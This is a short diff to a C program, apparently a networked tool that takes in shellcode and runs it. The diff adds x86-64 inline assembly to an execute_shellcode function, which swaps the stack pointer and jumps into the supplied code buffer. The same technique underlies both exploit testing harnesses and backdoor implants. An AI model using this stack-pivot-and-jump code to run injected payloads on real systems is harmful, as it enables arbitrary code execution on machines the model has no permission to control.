@@ -66,7 +66,10 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 	}
 }
 
-void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {
+void __attribute__ ((noinline)) execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {
+
+#ifdef __i386__
+
 	// We dont' care about the old stack or frame pointer
 	__asm__("pop %eax");
 	__asm__("pop %eax");
@@ -79,6 +82,16 @@ void execute_shellcode(const unsigned char *shellcode, const unsigned char *stac
 
 	// Finally jump to the shellcode
 	__asm__("jmp *%eax");
+
+#else
+
+	// Set up the new stack
+	__asm__("mov %rsi, %rsp");
+
+	// Finally jump to the shellcode
+	__asm__("jmp *%rdi");
+
+#endif
 }
 
 void run_shellcode(const unsigned char *shellcode, uint32_t size) {
